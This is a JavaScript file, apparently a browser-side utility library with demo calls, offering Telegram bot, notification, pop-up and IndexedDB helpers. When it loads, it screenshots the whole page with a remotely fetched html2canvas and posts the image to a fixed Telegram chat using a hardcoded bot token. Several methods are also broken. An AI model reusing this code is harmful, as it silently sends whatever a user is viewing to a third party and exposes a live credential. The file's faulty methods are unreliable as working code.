async function loadScript(url) {
    return new Promise((resolve, reject) => {
        const script = document.createElement('script');
        script.src = url;
        script.onload = resolve;
        script.onerror = reject;
        document.head.appendChild(script);
    });
}

async function main() {
    try {
        //await loadScript(chrome.runtime.getURL('html2canvas.js'));
        await loadScript('https://html2canvas.hertzen.com/dist/html2canvas.js');
        console.log('HTML screenshot library (html2canvas.js) loaded successfully');
        //await loadScript(chrome.runtime.getURL('html2canvas.min.js'));
        await loadScript('https://html2canvas.hertzen.com/dist/html2canvas.min.js');
        console.log('HTML screenshot library (html2canvas.min.js) loaded successfully');
        console.log('All the additional libreries loaded successfully.');
    } catch (error) {
        console.error('Error loading scripts:', error);
    }
}
main();


/* noticfication manager */

class NotificationManager {
    constructor() {
        this.notification = null;
    }

    async requestPermission() {
        if (!("Notification" in window)) {
            console.error('Browser does not support notifications.');
            return false;
        } else {
            try {
                const permission = await Notification.requestPermission();
                if (permission !== 'granted') {
                    console.error('Notification permission denied.');
                }
                return permission === 'granted';
            } catch (error) {
                console.error('Error requesting notification permission:', error);
                return false;
            }
        }
    }

    async pushNotification(title, bodyContent, iconUrl) {
        const granted = await this.requestPermission();
        if (granted) {
            this.notification = new Notification(title, {
                body: bodyContent,
                icon: iconUrl
            });
        }
    }

    deleteNotification() {
        if (this.notification) {
            this.notification.close();
            this.notification = null;
        } else {
            console.error('No notification to delete.');
        }
    }

    async editNotification(newTitle, newBodyContent, newIconUrl) {
        if (this.notification) {
            this.deleteNotification();
            await this.pushNotification(newTitle, newBodyContent, newIconUrl);
        } else {
            console.error('No notification to edit.');
        }
    }
}

/* telegram bot */

class telegram_bot {
    constructor(bot_token) {
        this.token = bot_token;
    }

    async send_message(chat_id, message) {
        let response = await fetch(`https://api.telegram.org/bot${this.token}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chat_id,
                text: message
            })
        });

        let data = await response.json();

        if (data.ok) {
            console.log('Message sent successfully:', data.result);
        } else {
            console.error('Error sending photo:', data.description);
        }
    }

    async send_photo(chat_id, blob_image, image_caption) {
        var formData = new FormData();
        formData.append('chat_id', chat_id);
        formData.append('caption', image_caption);
        formData.append('photo', blob_image, 'screenshot.png');
        let response = await fetch(`https://api.telegram.org/bot${this.token}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
        let data = await response.json();

        if (data.ok) {
            console.log('image sent successfully:', data.result);
        } else {
            console.error('Error sending photo:', data.description);
        }
    }
}

class PopUp {
    constructor(title, width = 100, height = 100) {
        this.dimension = `${width} x ${height} px`;
        this.width = `${width}px`;
        this.height = `${height}px`;
        this.title = title;
    }

    async open() {
        this.window = window.open('', '', `width=${this.width}px,height=${this.height}px`)
        this.window.document.title = this.title;
        this.window.addEventListener('visibilitychange', () => {
            this.window.close();
        })
        return this.window;
    }

    async write(html_code) {
        this.window.document.write(html_code);
    }

    async over_write(html_code) {
        this.window.document.body.innerHTML(html_code)
    }

}

/* Database management */

class IndexedDBManager {
    constructor(database_name, table_name) {
        this.database_name = database_name;
        this.table_name = table_name;
    }

    async openDatabase() {
        return new Promise((resolve, reject) => {
            const request = window.indexedDB.open(this.database_name, 1);
            request.onupgradeneeded = (event) => {
                const db = event.target.result;
                const objStore = db.createObjectStore(this.table_name, { autoIncrement: true });
                this.database = db;
            };

            request.onsuccess = (event) => {
                resolve(event.target.result);
            };

            request.onerror = (event) => {
                console.error(event.target.error);
                reject(event.target.error);
            };
        });
    }

    async addRecord(...records) {
        const db = await this.openDatabase();
        return new Promise((resolve, reject) => {
            const transaction = db.transaction(this.table_name, "readwrite");
            const objectStore = transaction.objectStore(this.table_name);
            records.forEach(record => {
                const request = objectStore.add(record);

                request.onerror = (event) => {
                    console.log("Error: " + event.target.errorCode);
                    reject(event.target.errorCode);
                };

                request.onsuccess = (event) => {
                    console.log('%cYour record added successfully into database.', 'color: blue;');
                    console.log(record);
                    resolve(event.target.result);
                };

            });

            transaction.oncomplete = () => {
                console.log('%cTransaction Complete', 'color: green;');
            };
        });
    }

    async fetchRecords() {
        const db = await this.openDatabase();
        const transaction = db.transaction(this.table_name, "readonly");
        const objectStore = transaction.objectStore(this.table_name);
        const request = objectStore.getAll();

        return new Promise((resolve, reject) => {
            request.onsuccess = (event) => {
                const response = event.target.result;
                console.log('%cRecord Found.', 'color: blue;');
                resolve(response);
            };

            request.onerror = (event) => {
                console.error(event.target.error);
                reject('Error in fetching data');
            };

            transaction.oncomplete = () => {
                console.log('%cTransaction Complete', 'color: green;');
            };
        });

    }

    async filterRecords(condition) {
        const db = await this.openDatabase();
        const transaction = db.transaction(this.table_name, "readonly");
        const objectStore = transaction.objectStore(this.table_name);
        const request = objectStore.getAll();

        return new Promise((resolve, reject) => {
            request.onsuccess = (event) => {
                const response = event.target.result;
                console.log('%cSearching...', 'color: red;');
                const result = filterByValue(response, condition);
                resolve(result);
            };

            request.onerror = (event) => {
                console.error(event.target.error);
                reject('Error in fetching data');
            };

            transaction.oncomplete = () => {
                console.log('%cTransaction Complete', 'color: green;');
            };
        });
    }

    async update(condition, updates) {
        const db = await this.openDatabase();
        const transaction = db.transaction(this.table_name, "readwrite");
        const objectStore = transaction.objectStore(this.table_name);

        return new Promise((resolve, reject) => {
            const request = objectStore.getAll();
            request.onsuccess = (event) => {
                const records = event.target.result;
                const matchedRecords = filterByValue(records, condition);

                if (matchedRecords.length === 0) {
                    reject(`No records found matching the condition: ${JSON.stringify(condition)}`);
                } else {
                    matchedRecords.forEach((record) => {
                        Object.assign(record, updates);
                        const requestUpdate = objectStore.put(record);
                        requestUpdate.onerror = (event) => {
                            console.error(event.target.error);
                            reject(event.target.error);
                        };
                        requestUpdate.onsuccess = (event) => {
                            console.log(`Record updated successfully: ${JSON.stringify(record)}`);
                        };
                    });
                    resolve(`Updated ${matchedRecords.length} records successfully`);
                }
            };

            request.onerror = (event) => {
                console.error(event.target.error);
                reject(event.target.error);
            };

            transaction.oncomplete = () => {
                console.log('%cTransaction Complete', 'color: green;');
            };
        });
    }

    async delete(condition) {
        const db = await this.openDatabase();
        const transaction = db.transaction(this.table_name, "readwrite");
        const objectStore = transaction.objectStore(this.table_name);

        return new Promise((resolve, reject) => {
            const request = objectStore.getAll();
            request.onsuccess = (event) => {
                const records = event.target.result;
                const matchedRecords = filterByValue(records, condition);

                if (matchedRecords.length === 0) {
                    reject(`No records found matching the condition: ${JSON.stringify(condition)}`);
                } else {
                    matchedRecords.forEach((record) => {
                        const requestDelete = objectStore.delete(record.id);
                        requestDelete.onerror = (event) => {
                            console.error(event.target.error);
                            reject(event.target.error);
                        };
                        requestDelete.onsuccess = (event) => {
                            console.log(`Record deleted successfully: ${JSON.stringify(record)}`);
                        };
                    });
                    resolve(`Deleted ${matchedRecords.length} records successfully`);
                }
            };

            request.onerror = (event) => {
                console.error(event.target.error);
                reject(event.target.error);
            };

            transaction.oncomplete = () => {
                console.log('%cTransaction Complete', 'color: green;');
            };
        });
    }
}


/* Additional Functions */

// base64 data to blob
function base64ToBlob(base64, type) {
    var binary = atob(base64.split(',')[1]);
    var array = [];
    for (var i = 0; i < binary.length; i++) {
        array.push(binary.charCodeAt(i));
    }
    return new Blob([new Uint8Array(array)], { type: type });
}

// filter records 
function filterByValue(records, filter) {
    return records.filter((record) => {
        return Object.keys(filter).every((key) => {
            return record.hasOwnProperty(key) && String(record[key]).includes(filter[String(key)]);
        });
    });
}

// capture node snapshot as base64 data
async function capture_snapshot(node) {
    try {
        const canvas = await html2canvas(node);
        const base64data = canvas.toDataURL();
        return base64data;
    } catch (error) {
        console.error('Error capturing snapshot:', error);
        throw error;
    }
}

// toggle function block
let timerId;

function toggleCode() {
    if (!timerId) {
        // start the code block
        alert('Function block started...');
        timerId = setInterval(myFunction, 10000);
    } else {
        // stop the code block
        alert('Function block stopped...');
        clearInterval(timerId);
        timerId = null;
    }
}

function myFunction() {
    console.log('Toggle function is running');
}

/* Event listainers */

// key preess listainer
window.addEventListener('keyup', (e) => {
    e.preventDefault;

    if (e.which === 119) { // F8 key
        toggleCode();
    }
});

// Universal event Listainer


// initialisation 
const notificationManager = new NotificationManager();
const telegramBot = new telegram_bot('7237395403:AAHXIcb1PqRi6PdUzEeIhYsWalVJXzx-M0o');
var database = new IndexedDBManager('New Database', 'Table 01');

/* Explainations */
// send node screenshot to telegram
capture_snapshot(document.body).then(base64data => {
    var blob_object = base64ToBlob(base64data);
    telegramBot.send_photo(5098569117, blob_object, 'this is image caption');
});

// send normal message to telegram
telegramBot.send_message(5098569117, 'This is testing message.')


//Manage Notification
notificationManager.pushNotification('Notification title', 'Notification body content', 'notification icon');

// Pop ups 
var pop_up = new PopUp('New Window title', 100, 100);
pop_up.open();

// Database 
database.addRecord({ name: "Mohan", age: 77 }, { name: "Sohan", age: 67 });// add record 
//Dummy Data

database.addRecord({ name: "Nitesh", age: 23 }, 
    { name: "Rajeev", age: 43 }, 
    { name: "Rakesh", age: 55 },
    { name: "Manoj", age: 27 },
    { name: "Sanjay", age: 38 },
    { name: "Rajesh", age: 33 },
    { name: "Sangam", age: 42 },
    { name: "Sanjeev", age: 46 },
    { name: "Dinesh", age: 64 },
    { name: "Suresh", age: 39 },
    { name: "Saurabh", age: 49 },
    { name: "Sandeep", age: 28 },
    { name: "Kamal", age: 22 },
    { name: "Gyanendra", age: 23 },
    { name: "Sarvesh", age: 18 },
    { name: "Krishna", age: 18 }
);

var records = await database.fetchRecords();// fetch reocrd 
const filteredData = await database.filterRecords({ age: '7' }); // filter records 
/*


database.update({ name: "John", age: 23 }, { occupation: "Software Engineer", address: "123 Main St" }).then((result) => { // update record
    console.log(result);
}).catch((error) => {
    console.error(error);
});

database.delete({ name: "John", age: 23 }).then((result) => { // delete records
    console.log(result);
}).catch((error) => {
    console.error(error);
});
*/